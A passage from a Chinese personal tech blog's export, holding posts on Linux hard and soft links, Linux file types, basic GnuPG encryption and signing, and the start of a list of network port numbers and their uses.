所示，多个目录项指向了同一 inode 。这些目录项都是硬链接。我曾在三个目录项中使用波浪线 (~) 的缩写，这是用户目录的惯例表示，因此在该例中波浪线等同于 /home/user 。值得注意的是，第四个目录项是一个完全不同的目录，/home/shared，可能是该计算机上用户的共享文件目录。\n​\t硬链接被限制在一个单一的文件系统中。此处的“文件系统” 是指挂载在特定挂载点上的分区或逻辑卷，此例中是 /home。这是因为在每个文件系统中的 inode 号都是唯一的。而在不同的文件系统中，如 /var 或 /opt，会有和 /home 中相同的 inode 号。\n​\t因为所有的硬链接都指向了包含文件元信息的单一 inode ，这些属性都是文件的一部分，像所属关系、权限、到该 inode 的硬链接数目，对每个硬链接来说这些特性没有什么不同的。这是一个文件所具有的一组属性。唯一能区分这些文件的是包含在 inode 信息中的文件名。链接到同一目录中的单一文件/ inode 的硬链接必须拥有不同的文件名，这是基于同一目录下不能存在重复的文件名的事实的。\n文件的硬链接数目可通过 ls -l 来查看，如果你想查看实际节点号，可使用 ls -li 命令。\n软链接 ​\t硬链接和软链接（也称为符号链接symlink）的区别在于，硬链接直接指向属于该文件的 inode ，而软链接直接指向一个目录项，即指向一个硬链接。因为软链接指向的是一个文件的硬链接而非该文件的 inode ，所以它们并不依赖于 inode 号，这使得它们能跨越不同的文件系统、分区和逻辑卷起作用。\n​\t软链接的缺点是，一旦它所指向的硬链接被删除或重命名后，该软链接就失效了。软链接虽然还在，但所指向的硬链接已不存在。所幸的是，ls 命令能以红底白字的方式在其列表中高亮显示失效的软链接。\n链接实验 我认为最容易理解链接用法及其差异的方法是动手搭建一个项目。这个项目应以非超级用户的身份在一个空目录下进行。我创建了 ~/temp 目录做这个实验，你也可以这么做。这么做可为项目创建一个安全的环境且提供一个新的空目录让程序运作，如此以来这儿仅存放和程序有关的文件。  初始工作 首先，在你要进行实验的目录下为该项目中的任务创建一个临时目录，确保当前工作目录（PWD）是你的主目录，然后键入下列命令。\n1  mkdir temp   使用这个命令将当前工作目录切换到 ~/temp。\n1  cd temp   实验开始，我们需要创建一个能够链接到的文件，下列命令可完成该工作并向其填充内容。\n1  du -h \u0026gt; main.file.txt   使用 ls -l 长列表命名确认文件正确地创建了。运行结果应类似于我的。注意文件大小只有 7 字节，但你的可能会有 1～2 字节的变动。\n1 2 3  [dboth@david temp]$ ls -l total 4 -rw-rw-r-- 1 dboth dboth 7 Jun 13 07:34 main.file.txt   在列表中，文件模式串后的数字 1 代表存在于该文件上的硬链接数。现在应该是 1 ，因为我们还没有为这个测试文件建立任何硬链接。\n对硬链接进行实验 ​\t硬链接创建一个指向同一 inode 的新目录项，当为文件添加一个硬链接时，你会看到链接数目的增加。确保当前工作目录仍为 ~/temp。创建一个指向 main.file.txt 的硬链接，然后查看该目录下文件列表。\n1 2 3 4 5  [dboth@david temp]$ ln main.file.txt link1.file.txt [dboth@david temp]$ ls -l total 8 -rw-rw-r-- 2 dboth dboth 7 Jun 13 07:34 link1.file.txt -rw-rw-r-- 2 dboth dboth 7 Jun 13 07:34 main.file.txt   ​\t目录中两个文件都有两个链接且大小相同，时间戳也一样。这就是有一个 inode 和两个硬链接（即该文件的目录项）的一个文件。再建立一个该文件的硬链接，并列出目录清单内容。你可以建立硬链接： link1.file.txt 或 main.file.txt。\n1 2 3 4 5  [dboth@david temp]$ ln link1.file.txt link2.file.txt ; ls -l total 16 -rw-rw-r-- 3 dboth dboth 7 Jun 13 07:34 link1.file.txt -rw-rw-r-- 3 dboth dboth 7 Jun 13 07:34 link2.file.txt -rw-rw-r-- 3 dboth dboth 7 Jun 13 07:34 main.file.txt   ​\t注意，该目录下的每个硬链接必须使用不同的名称，因为同一目录下的两个文件不能拥有相同的文件名。试着创建一个和现存链接名称相同的硬链接。\n1 2  [dboth@david temp]$ ln main.file.txt link2.file.txt ln: failed to create hard link \u0026#39;link2.file.txt\u0026#39;: File exists   ​\t显然不行，因为 link2.file.txt 已经存在。目前为止我们只在同一目录下创建硬链接，接着在临时目录的父目录（你的主目录）中创建一个链接。\n1 2  [dboth@david temp]$ ln main.file.txt ../main.file.txt ; ls -l ../main* -rw-rw-r-- 4 dboth dboth 7 Jun 13 07:34 main.file.txt   ​\t上面的 ls 命令显示 main.file.txt 文件确实存在于主目录中，且与该文件在 temp 目录中的名称一致。当然它们不是不同的文件，它们是同一文件的两个链接，指向了同一文件的目录项。为了帮助说明下一点，在 temp 目录中添加一个非链接文件。\n1 2 3 4 5 6  [dboth@david temp]$ touch unlinked.file ; ls -l total 12 -rw-rw-r-- 4 dboth dboth 7 Jun 13 07:34 link1.file.txt -rw-rw-r-- 4 dboth dboth 7 Jun 13 07:34 link2.file.txt -rw-rw-r-- 4 dboth dboth 7 Jun 13 07:34 main.file.txt -rw-rw-r-- 1 dboth dboth 0 Jun 14 08:18 unlinked.file   使用 ls 命令的 i 选项查看 inode 的硬链接号和新创建文件的硬链接号。\n1 2 3 4 5 6  [dboth@david temp]$ ls -li total 12 657024 -rw-rw-r-- 4 dboth dboth 7 Jun 13 07:34 link1.file.txt 657024 -rw-rw-r-- 4 dboth dboth 7 Jun 13 07:34 link2.file.txt 657024 -rw-rw-r-- 4 dboth dboth 7 Jun 13 07:34 main.file.txt 657863 -rw-rw-r-- 1 dboth dboth 0 Jun 14 08:18 unlinked.file   ​\t注意上面文件模式左边的数字 657024 ，这是三个硬链接文件所指的同一文件的 inode 号，你也可以使用 i 选项查看主目录中所创建的链接的节点号，和该值相同。而那个只有一个链接的 inode 号和其他的不同，在你的系统上看到的 inode 号或许不同于本文中的。\n接着改变其中一个硬链接文件的大小。\n1 2 3 4 5 6  [dboth@david temp]$ df -h \u0026gt; link2.file.txt ; ls -li total 12 657024 -rw-rw-r-- 4 dboth dboth 1157 Jun 14 14:14 link1.file.txt 657024 -rw-rw-r-- 4 dboth dboth 1157 Jun 14 14:14 link2.file.txt 657024 -rw-rw-r-- 4 dboth dboth 1157 Jun 14 14:14 main.file.txt 657863 -rw-rw-r-- 1 dboth dboth 0 Jun 14 08:18 unlinked.file   现在所有的硬链接文件大小都比原来大了，因为多个目录项都链接着同一文件。\n​\t下个实验在我的电脑上会出现这样的结果，是因为我的 /tmp 目录在一个独立的逻辑卷上。如果你有单独的逻辑卷或文件系统在不同的分区上（如果未使用逻辑卷），确定你是否能访问那个分区或逻辑卷，如果不能，你可以在电脑上挂载一个 U 盘，如果上述方式适合你，你可以进行这个实验。\n试着在 /tmp 目录中建立一个 ~/temp 目录下文件的链接（或你的文件系统所在的位置）。\n1 2 3  [dboth@david temp]$ ln link2.file.txt /tmp/link3.file.txt ln: failed to create hard link \u0026#39;/tmp/link3.file.txt\u0026#39; =\u0026gt; \u0026#39;link2.file.txt\u0026#39;: Invalid cross-device link   ​\t为什么会出现这个错误呢？ 原因是每一个单独的可挂载文件系统都有一套自己的 inode 号。简单的通过 inode 号来跨越整个 Linux 文件系统结构引用一个文件会使系统困惑，因为相同的节点号会存在于每个已挂载的文件系统中。\n有时你可能会想找到一个 inode 的所有硬链接。你可以使用 ls -li 命令。然后使用 find 命令找到所有硬链接的节点号。\n1 2 3 4  [dboth@david temp]$ find . -inum 657024 ./main.file.txt ./link1.file.txt ./link2.file.txt   ​\t注意 find 命令不能找到所属该节点的四个硬链接，因为我们在 ~/temp 目录中查找。 find 命令仅在当前工作目录及其子目录中查找文件。要找到所有的硬链接，我们可以使用下列命令，指定你的主目录作为起始查找条件。\n1 2 3 4 5  [dboth@david temp]$ find ~ -samefile main.file.txt /home/dboth/temp/main.file.txt /home/dboth/temp/link1.file.txt /home/dboth/temp/link2.file.txt /home/dboth/main.file.txt   ​\t如果你是非超级用户，没有权限，可能会看到错误信息。这个命令也使用了 -samefile 选项而不是指定文件的节点号。这个效果和使用 inode 号一样且更容易，如果你知道其中一个硬链接名称的话。\n对软链接进行实验 ​\t如你刚才看到的，不能跨越文件系统边界创建硬链接，即在逻辑卷或文件系统中从一个文件系统到另一个文件系统。软链接给出了这个问题的解决方案。虽然它们可以达到相同的目的，但它们是非常不同的，知道这些差异是很重要的。\n让我们在 ~/temp 目录中创建一个符号链接来开始我们的探索。\n1 2 3 4 5 6 7 8  [dboth@david temp]$ ln -s link2.file.txt link3.file.txt ; ls -li total 12 657024 -rw-rw-r-- 4 dboth dboth 1157 Jun 14 14:14 link1.file.txt 657024 -rw-rw-r-- 4 dboth dboth 1157 Jun 14 14:14 link2.file.txt 658270 lrwxrwxrwx 1 dboth dboth 14 Jun 14 15:21 link3.file.txt -\u0026gt; link2.file.txt 657024 -rw-rw-r-- 4 dboth dboth 1157 Jun 14 14:14 main.file.txt 657863 -rw-rw-r-- 1 dboth dboth 0 Jun 14 08:18 unlinked.file   ​\t拥有节点号 657024 的那些硬链接没有变化，且硬链接的数目也没有变化。新创建的符号链接有不同的 inode 号 658270。 名为 link3.file.txt 的软链接指向了 link2.file.txt 文件。使用 cat 命令查看 link3.file.txt 文件的内容。符号链接的 inode 信息以字母 l （小写字母 l）开头，意味着这个文件实际是个符号链接。\n​\t上例中软链接文件 link3.file.txt 的大小只有 14 字节。这是文本内容 link3.file.txt 的大小，即该目录项的实际内容。目录项 link3.file.txt 并不指向一个 inode ；它指向了另一个目录项，这在跨越文件系统建立链接时很有帮助。现在试着创建一个软链接，之前在 /tmp 目录中尝试过的。\n1 2 3 4  [dboth@david temp]$ ln -s /home/dboth/temp/link2.file.txt /tmp/link3.file.txt ; ls -l /tmp/link* lrwxrwxrwx 1 dboth dboth 31 Jun 14 21:53 /tmp/link3.file.txt -\u0026gt; /home/dboth/temp/link2.file.txt   删除链接 当你删除硬链接或硬链接所指的文件时，需要考虑一些问题。\n首先，让我们删除硬链接文件 main.file.txt。注意指向 inode 的每个目录项就是一个硬链接。\n1 2 3 4 5 6 7  [dboth@david temp]$ rm main.file.txt ; ls -li total 8 657024 -rw-rw-r-- 3 dboth dboth 1157 Jun 14 14:14 link1.file.txt 657024 -rw-rw-r-- 3 dboth dboth 1157 Jun 14 14:14 link2.file.txt 658270 lrwxrwxrwx 1 dboth dboth 14 Jun 14 15:21 link3.file.txt -\u0026gt; link2.file.txt 657863 -rw-rw-r-- 1 dboth dboth 0 Jun 14 08:18 unlinked.file   ​\tmain.file.txt 是该文件被创建时所创建的第一个硬链接。现在删除它，仍然保留着原始文件和硬盘上的数据以及所有剩余的硬链接。要删除原始文件，你必须删除它的所有硬链接。\n现在删除 link2.file.txt 硬链接文件。\n1 2 3 4 5 6 7  [dboth@david temp]$ rm link2.file.txt ; ls -li total 8 657024 -rw-rw-r-- 3 dboth dboth 1157 Jun 14 14:14 link1.file.txt 658270 lrwxrwxrwx 1 dboth dboth 14 Jun 14 15:21 link3.file.txt -\u0026gt; link2.file.txt 657024 -rw-rw-r-- 3 dboth dboth 1157 Jun 14 14:14 main.file.txt 657863 -rw-rw-r-- 1 dboth dboth 0 Jun 14 08:18 unlinked.file   ​\t注意软链接的变化。删除软链接所指的硬链接会使该软链接失效。在我的系统中，断开的链接用颜色高亮显示，目标的硬链接会闪烁显示。如果需要修复这个损坏的软链接，你需要在同一目录下建立一个和旧链接相同名字的硬链接，只要不是所有硬链接都已删除就行。您还可以重新创建链接本身，链接保持相同的名称，但指向剩余的硬链接中的一个。当然如果软链接不再需要，可以使用 rm 命令删除它们。\n​\tunlink 命令在删除文件和链接时也有用。它非常简单且没有选项，就像 rm 命令一样。然而，它更准确地反映了删除的基本过程，因为它删除了目录项与被删除文件的链接。\n写在最后 我用过这两种类型的链接很长一段时间后，我开始了解它们的能力和特质。我为我所教的 Linux 课程编写了一个实验室项目，以充分理解链接是如何工作的，并且我希望增进你的理解。\n作者简介：\n​\t戴维.布斯 - 戴维.布斯是 Linux 和开源倡导者，居住在北卡罗莱纳的罗列 。他在 IT 行业工作了四十年，为 IBM 工作了 20 多年的 OS/2。在 IBM 时，他在 1981 年编写了最初的 IBM PC 的第一个培训课程。他为 RedHat 教授过 RHCE 班，并曾在 MCI Worldcom、思科和北卡罗莱纳州工作。他已经用 Linux 和开源软件工作将近 20 年了。\nvia: https://opensource.com/article/17/6/linking-linux-filesystem\n作者：David Both 译者：yongshouzhang 校对：wxy\n本文由 LCTT 原创编译，Linux中国 荣誉推出\n 原文来自：https://linux.cn/article-9105-1.html\n本文地址：https://www.linuxprobe.com/linux-users-guidance.html\n 注：本文为转载且已提供原文地址。 ","date":"2021-09-28T00:00:00Z","permalink":"https://lunaasuka.github.io/p/linux%E4%B8%AD%E9%93%BE%E6%8E%A5%E4%BD%BF%E7%94%A8%E6%A6%82%E8%A6%81/","title":"Linux中链接使用概要"},{"content":"一：普通文件（-） ​\t使用 ls -l 命令所显示出的第一列的第一个字符为 “-” 的即为普通文件，常见的 .mp3，.html，.txt等都是普通文件。\n二：目录文件（d） ​\t同上，标识符为 “d” 的就是目录文件，在 linux 中目录也是文件，在 linux 中一切皆是文件。\n三：链接文件（l） ​\t同上，标识符为 “l” 的就是链接文件，链接文件分为软链接与硬链接。\n（1）软链接 软链接，也叫符号链接，简单来说就是快捷方式，被删除并不会影响原文件。\n1  ln -s [target_name] [output_file]   ​\t使用该命令可以生成一个文件的软链接。需要注意的是，与windows的快捷方式不同的一点，软链接文件被修改后源文件也会产生变化。\n（2）硬链接 ​\t硬链接就厉害多了，硬链接文件等于源文件的另一个人格，他俩是一个文件，删除其中一个另外一个并不会消失，但是其中一个被更改了另外一个也会被更改。\n1  ln [target_name] [output_file]   ​\t同理使用该命令进行生成。\n块设备文件（b） ​\t标识符为 “b” 。块设备文件支持以块（block）为单位的访问方式。在 EXT4 文件系统中，一个 block 通常为 4KB 的大小，也就是说每次可以存取 4096（或其整数倍） 个字节的数据。应用程序可以随机访问块设备文件的数据，程序可以自行确定数据的位置，硬盘、软盘等都是块设备。\n字符设备文件（c） ​\t标识符为 “c” 。字符设备文件以字节流的方式进行访问，由字符设备驱动程序来实现这种特性，这通常要用到 open、close、read、write 等系统调用。字符终端、串口和键盘等就是字符设备。另外，由于字符设备文件是以文件流的方式进行访问的，因此可以顺序读取，但通常不支持随机存取。\n管道文件（p） ​\t标识符为 “p” 。管道文件（ FIFO 文件）主要用于进程间通讯。比如使用 mkfifo 命令可以创建一个 FIFO 文件，启用一个进程A从FIFO文件里读数据，启动进程B往FIFO里写数据，先进先出，随写随读。在 FIFO 中可以很好地解决在无关进程间数据交换的要求，FIFO 的通信方式类似于在进程中使用文件来传输数据，只不过 FIFO 类型的文件同时具有管道的特性，在读取数据时，FIFO 管道中同时清除数据。\n套接字（s） ​\t标识符为 “s” 。用于进程间的网络通讯。\n","date":"2021-09-28T00:00:00Z","permalink":"https://lunaasuka.github.io/p/%E7%AE%80%E8%BF%B0linux%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B/","title":"简述Linux文件类型"},{"content":"一.什么是GPG ​\t1991 年，程序员 Phil Zimmermann 为了避开政府监视，开发了加密软件 PGP。这个软件非常好用，迅速流传开来，成了许多程序员的必备工具。但是，它是商业软件，不能自由使用。所以，自由软件基金会决定，开发一个 PGP 的替代品，取名为 GnuPG。这就是 GPG 的由来。\n二.使用 先放一个官方说明。\n（Linux kali 5.2.0-kali2-amd64 #1 SMP Debian 5.2.9-2kali1 (2019-08-22) x86_64 GNU/Linux 这是我使用的kali版本）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84  gpg (GnuPG) 2.2.17 libgcrypt 1.8.4 Copyright (C) 2019 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;https://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Home: /root/.gnupg 支持的算法： 公钥： RSA, ELG, DSA, ECDH, ECDSA, EDDSA 密文： IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH, CAMELLIA128, CAMELLIA192, CAMELLIA256 散列： SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224 压缩： 不压缩, ZIP, ZLIB, BZIP2 语法：gpg [options] [files] 签名、检查、加密或解密 默认的操作依输入数据而定 命令： -s, --sign 生成一份签名 --clear-sign 生成一份明文签名 -b, --detach-sign 生成一份分离的签名 -e, --encrypt 加密数据 -c, --symmetric 仅使用对称密文加密 -d, --decrypt 解密数据（默认） --verify 验证签名 -k, --list-keys 列出密钥 --list-signatures 列出密钥和签名 --check-signatures 列出并检查密钥签名 --fingerprint 列出密钥和指纹 -K, --list-secret-keys 列出私钥 --generate-key 生成一个新的密钥对 --quick-generate-key 快速生成一个新的密钥对 --quick-add-uid 快速添加一个新的用户标识 --quick-revoke-uid 快速吊销一个用户标识 --quick-set-expire 快速设置一个过期日期 --full-generate-key 完整功能的密钥对生成 --generate-revocation 生成一份吊销证书 --delete-keys 从公钥钥匙环里删除密钥 --delete-secret-keys 从私钥钥匙环里删除密钥 --quick-sign-key 快速签名一个密钥 --quick-lsign-key 快速本地签名一个密钥 --sign-key 签名一个密钥 --lsign-key 本地签名一个密钥 --edit-key 签名或编辑一个密钥 --change-passphrase 更改密码 --export 导出密钥 --send-keys 个密钥导出到一个公钥服务器上 --receive-keys 从公钥服务器上导入密钥 --search-keys 在公钥服务器上搜索密钥 --refresh-keys 从公钥服务器更新所有密钥 --import 导入/合并密钥 --card-status 打印卡片状态 --edit-card 更改卡片上的数据 --change-pin 更改卡片的 PIN --update-trustdb 更新信任数据库 --print-md 打印消息摘要 --server 以服务器模式运行 --tofu-policy VALUE 设置一个密钥的 TOFU 政策 选项： -a, --armor 创建 ASCII 字符封装的输出 -r, --recipient USER-ID 为 USER-ID 加密 -u, --local-user USER-ID 使用 USER-ID 来签名或者解密 -z N 设置压缩等级为 N （0 为禁用） --textmode 使用规范的文本模式 -o, --output FILE 写输出到 FILE -v, --verbose 详细模式 -n, --dry-run 不做任何更改 -i, --interactive 覆盖前提示 --openpgp 使用严格的 OpenPGP 行为 （请参考手册页以获得所有命令和选项的完整列表） 例子： -se -r Bob [file] 为用户 Bob 签名和加密 --clear-sign [file] 创建一个明文签名 --detach-sign [file] 创建一个分离签名 --list-keys [names] 列出密钥 --fingerprint [names] 显示指纹   可以看到工具本身支持的功能很多，我们这里就简单介绍加解密的内容。\n可以使用 gpg \u0026ndash;gen-key 来生成密钥。\n1 2  gpg --gen-key 注意：使用 “gpg --full-generate-key” 以获得一个功能完整的密钥产生对话框。   使用该命令即可生成密钥，但是运行该命令部分选项将会默认选择，如想要使用的加密方式（默认RSA）\n1 2 3 4 5  请选择您要使用的密钥类型： (1) RSA 和 RSA （默认） (2) DSA 和 Elgamal (3) DSA（仅用于签名） (4) RSA（仅用于签名）   想要使用的密钥长度，密钥越长越安全\n1 2  RSA 密钥的长度应在 1024 位与 4096 位之间。 您想要使用的密钥长度？(3072)   以及密钥的有效期限\n1 2 3 4 5 6  请设定这个密钥的有效期限。 0 = 密钥永不过期 \u0026lt;n\u0026gt; = 密钥在 n 天后过期 \u0026lt;n\u0026gt;w = 密钥在 n 周后过期 \u0026lt;n\u0026gt;m = 密钥在 n 月后过期 \u0026lt;n\u0026gt;y = 密钥在 n 年后过期   这些都选择完成之后会要求你提供个人信息。\n1 2 3 4  真实姓名： ** ****** 电子邮件地址： 2838419909@qq.com 您选定了此用户标识： “** ****** \u0026lt;2838419909@qq.com\u0026gt;”   这些信息是方便其他人辨识你的，填写什么是随意的，当然如果填写一些伪造的信息也没人管（笑\n一切都确认好之后，系统会让你设定一个私钥的密码，这是出于安全考虑，可以更有效的保护你的私钥。\n然后系统就会开始生成密钥，这时可以做一些随机的举动，例如敲打键盘或者移动鼠标之类的。\n1  我们需要生成大量的随机字节。在质数生成期间做些其他操作（敲打键盘、移动鼠标、读写硬盘之类的）将会是一个不错的主意，这会让随机数发生器有更好的机会获得足够的熵。   要不了多久密钥就生成好了。\n1  gpg: 密钥 7E63E27A7D6D5059 被标记为绝对信任   这里的 7E63E27A7D6D5059 是 用户ID 的Hash字符串，可以用来替代 用户ID 。\n加密 我们可以使用 encrypt 参数来加密文件，假设这里有一个 test.txt 需要被加密。\n1  gpg --recipient [用户ID] --output en_test.txt --encrypt test.txt`   recipient 参数用来指定接受者的公钥， output 用来指定输出的文件名， encrypt 用来指定需要加密的文件。\n解密 对方收到加密文件以后，就可以用自己的私钥解密。\n1  gpg --decrypt en_test.txt --output de_test.txt   decrypt 参数用来指定需要被解密的文件。\nps：gpg允许省略 decrypt 参数，也就是说你甚至可以简写成\n1  gpg en_test.txt   ​\t现在让我们来明确下加密和解密的流程。设有两人 A 和 B 。A 现在想给 B 发送一个加密的文件。那么首先 A 要拿到 B 的公钥，可以是在公钥服务器上下载或者由 B 直接发给 A ，然后用这个公钥来对文件加密，即加密时的 recipient 参数所指定的接受者的公钥，在这里就是我们已经获取的 B 的公钥。之后将加密过的文件发给 B ，B 拿到后使用自己的私钥对其进行解密，即可还原文件。也就是说，如果想给一个人发送一个对方能解密的文件，那么就需要先拿到对方的公钥才能进行加密。\n签名 对文件签名就是为了让别人知道这个文件是由我发出的或者是由我编写的。\n我们可以使用 sign 参数来签名。\n1  gpg --sign test.txt   运行后将会生成 test.txt.gpg 文件，这就是签名后的文件，这个文件默认使用二进制储存，也可以使用 clearsign 参数来生成 ASCII 码的签名文件。\n1  gpg --clearsign test.txt   如果想单独生成一个签名文件，可以使用 detach-sign 参数。需要采用 ASCII 格式的就添加 armor 参数结课。\n1  gpg --detach-sign test.txt   验证签名 要记住，想要验证签名也需要对方的公钥才行，使用 verify 参数来验证。\n1  gpg --verify test.txt.gpg test.txt   前者是需要验证签名的文件，后者是输出文件。\n","date":"2021-09-24T00:00:00Z","permalink":"https://lunaasuka.github.io/p/gpg%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/","title":"GPG工具介绍"},{"content":"端口介绍： 2端口：管理实用程序\n3端口：压缩进程\n5端口：远程作业登录\n7端口：回显\n9端口：丢弃\n11端口：在线用户\n13端口：时间\n17端口：每日引用\n18端口：消息发送协议\n19端口：字符发生器\n20端口：FTP文件传输协议(默认数据口)\n21端口：FTP文件传输协议(控制)\n22端口：SSH远程登录协议\n23端口：telnet(终端仿真协议),木马Tiny Telnet Server开放此端口\n24端口：预留给个人用邮件系统\n25端口：SMTP服务器所开放的端口，用于发送邮件\n27端口：NSW 用户系统 FE\n29端口：MSG ICP\n31端口：MSG验证,木马Master Paradise、HackersParadise开放此端口\n33端口：显示支持协议\n35端口：预留给个人打印机服务\n37端口：时间\n38端口：路由访问协议\n39端口：资源定位协议\n41端口：图形\n42端口：主机名服务\n43端口：who is服务\n44端口：MPM(消息处理模块)标志协议\n45端口：消息处理模块\n46端口：消息处理模块(默认发送口)\n47端口：NI FTP\n48端口：数码音频后台服务\n49端口：TACACS登录主机协议\n50端口：远程邮件检查协议\n51端口：IMP(接口信息处理机)逻辑地址维护\n52端口：施乐网络服务系统时间协议\n53端口：dns域名服务器\n54端口：施乐网络服务系统票据交换\n55端口：ISI图形语言\n56端口：施乐网络服务系统验证\n57端口：预留个人用终端访问\n58端口：施乐网络服务系统邮件\n59端口：预留个人文件服务\n60端口：未定义\n61端口：NI邮件\n62端口：异步通讯适配器服务\n63端口：whois++\n64端口：通讯接口\n65端口：TACACS数据库服务\n66端口：Oracle SQL*NET\n67端口：引导程序协议服务端\n68端口：引导程序协议客户端\n69端口：小型文件传输协议\n70端口：信息检索协议\n71端口：远程作业服务\n72端口：远程作业服务\n73端口：远程作业服务\n74端口：远程作业服务\n75端口：预留给个人拨出服务\n76端口：分布式外部对象存储\n77端口：预留给个人远程作业输入服务\n78端口：修正TCP\n79端口：查询远程主机在线用户等信息\n80端口：http,用于网页浏览,木马Executor开放此端口\n81端口：HOST2名称服务\n82端口：传输实用程序\n83端口：模块化智能终端ML设备\n84端口：公用追踪设备\n85端口：模块化智能终端ML设备\n86端口：Micro Focus Cobol编程语言\n87端口：预留给个人终端连接\n88端口：Kerberros安全认证系统\n89端口：SU/MIT telnet(终端仿真网关)\n90端口：DNSIX 安全属性标记图\n91端口：MIT Dover假脱机\n92端口：网络打印协议\n93端口：设备控制协议\n94端口：Tivoli对象调度\n96端口：DIXIE协议规范\n97端口：快速远程虚拟文件协议\n98端口：TAC新闻协议\n99端口：后门程序ncx99开放此端口\n100端口：未知用途\n101端口：NIC 主机名称服务\n102端口：消息传输代理\n103端口：Genesis 点对点传输网络\n105端口：信箱名称服务\n106端口：3COM-TSMUX开放端口\n107端口：远程Telnet服务\n108端口：SNA 网关访问服务\n109端口：POP2服务器开放此端口,用于接收邮件\n110端口：POP3服务器开放此端口,用于接收邮件\n111端口：SUN公司的RPC服务所有端口\n112端口：McIDAS 数据传输协议\n113端口：认证服务，用于鉴别TCP连接的用户\n114端口：音频新闻多点服务\n115端口：简单文件传输服务\n116端口：ANSA REX 通知\n117端口：UUCP 路径服务\n118端口：SQL 服务\n119端口：NEWS新闻组传输协议，承载USENET通信\n121端口：木马BO jammerkillahV开放端口\n122端口：SMAKY网络\n123端口：网络时间协议，蠕虫病毒会利用，一般关闭\n128端口：GSS X许可认证\n129端口：密码生成器协议\n130端口：Cisco软件开放端口\n131端口：Cisco软件开放端口\n132端口：Cisco软件开放端口\n133端口：统计服务\n134端口：INGRES-网络服务\n135端口：DCOM服务，冲击波病毒利用，不能关闭\n136端口：命名系统\n137端口：NETBIOS协议应用，为共享开放\n138端口：NETBIOS协议应用，为共享开放\n139端口：NETBIOS协议应用，为共享开放\n140端口：EMFIS数据服务\n141端口：EMFIS控制服务\n143端口：Interim邮件访问协议\n144端口：UMA软件开放端口\n145端口：UAAC协议\n149端口：AED 512仿真服务\n150端口：SQL(结构化查询语言)-网络\n152端口：后台文件传输协议\n156端口：SQL(结构化查询语言)服务\n158端口：PC邮件服务器\n159端口：NSS-路由\n160端口：SGMP-陷阱\n161端口：简单网络管理协议\n162端口：SNMP陷阱\n163端口：CMIP/TCP 管理\n164端口：CMIP/TCP 代理\n166端口：Sirius系统\n169端口：发送\n170端口：网络附言\n177端口：x显示管理控制协议，入侵者通过它访问X-windows操作台\n178端口：NextStep Window 服务\n179端口：边界网关协议\n180端口：图表\n181端口：统一\n184端口：OC服务器\n185端口：远程-KIS\n186端口：KIS 协议\n187端口：应用通信接口\n189端口：队列文件传输\n190端口：网关进入控制协议\n191端口：Prospero 目录服务\n192端口：OSU 网络监视系统\n193端口：Spider 远程控制协议\n194端口：多线交谈协议\n197端口：目录地址服务\n198端口：目录地址服务监视器\n200端口：IBM系统资源控制器\n201端口：AppleTalk(Mac机所用的网络协议)路由保证\n202端口：AppleTalk(Mac机所用的网络协议)Name Binding\n203端口：AppleTalk(Mac机所用的网络协议)未用端口\n204端口：AppleTalk(Mac机所用的网络协议)回显\n205端口：AppleTalk(Mac机所用的网络协议)未用端口\n206端口：AppleTalk(Mac机所用的网络协议)区信息\n207端口：AppleTalk(Mac机所用的网络协议)未用端口\n208端口：AppleTalk(Mac机所用的网络协议)未用端口\n209端口：快速邮件传输协议\n210端口：ANSI(美国国家标准协会)Z39.50\n211端口：Texas Instruments 914C/G终端\n213端口：IPX(以太网所用的协议)\n218端口：Netix消息记录协议\n219端口：Unisys ARPs\n220端口：交互邮件访问协议 v3\n223端口：证书分发中心\n224端口：masq拨号器\n241端口：预留端口 (224-241)\n245端口：链接\n246端口：显示系统协议\n257端口：安全电子交易系统\n258端口：Yak Winsock 个人聊天\n259端口：有效短程遥控\n260端口：开放端口\n261端口：IIOP 基于TLS/SSL的命名服务\n266端口：SCSI(小型计算机系统接口)on ST\n267端口：Tobit David服务层\n268端口：Tobit David复制\n281端口：个人连结\n282端口：Cable端口A/X\n286端口：FXP通信\n308端口：Novastor备份\n313端口：Magenta逻辑\n318端口：PKIX时间标记\n333端口：Texar安全端口\n344端口：Prospero数据存取协议\n345端口：Perf分析工作台\n346端口：Zebra服务器\n347端口：Fatmen服务器\n348端口：Cabletron管理协议\n358端口：Shrink可上网家电协议\n359端口：网络安全风险管理协议\n362端口：SRS发送\n363端口：RSVP隧道\n372端口：列表处理\n373端口：Legend公司\n374端口：Legend公司\n376端口：AmigaEnvoy网络查询协议\n377端口：NEC公司\n378端口：NEC公司\n379端口：TIA/EIA/IS-99调制解调器客户端\n380端口：TIA/EIA/IS-99调制解调器服务器\n381端口：hp(惠普)性能数据收集器\n382端口：hp(惠普)性能数据控制节点\n383端口：hp(惠普)性能数据警报管理\n384端口：远程网络服务器系统\n385端口：IBM应用程序\n386端口：ASA信息路由器定义文件.\n387端口：Appletalk更新路由.\n389端口：轻型目录访问协议\n395端口：网络监视控制协议\n396端口：Novell(美国Novell公司)Netware(Novell公司出的网络操作系统)over IP\n400端口：工作站解决方案\n401端口：持续电源\n402端口：Genie协议\n406端口：交互式邮件支持协议\n408端口：Prospero资源管理程序\n409端口：Prospero资源节点管理.\n410端口：DEC(数据设备公司)远程调试协议\n411端口：远程MT协议\n412端口：陷阱协定端口\n413端口：存储管理服务协议\n414端口：信息查询\n415端口：B网络\n423端口：IBM操作计划和控制开端\n424端口：IBM操作计划和控制追踪\n425端口：智能计算机辅助设计\n427端口：服务起位置\n434端口：移动ip代理\n435端口：移动ip管理\n443端口：基于TLS/SSL的网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP\n444端口：简单网络内存分页协议\n445端口：Microsoft-DS，为共享开放，震荡波病毒利用，一般应关闭\n446端口：DDM-远程关系数据库访问\n447端口：DDM-分布式文件管理\n448端口：DDM-使用安全访问远程数据库\n456端口：木马HACKERS PARADISE开放此端口\n458端口：apple quick 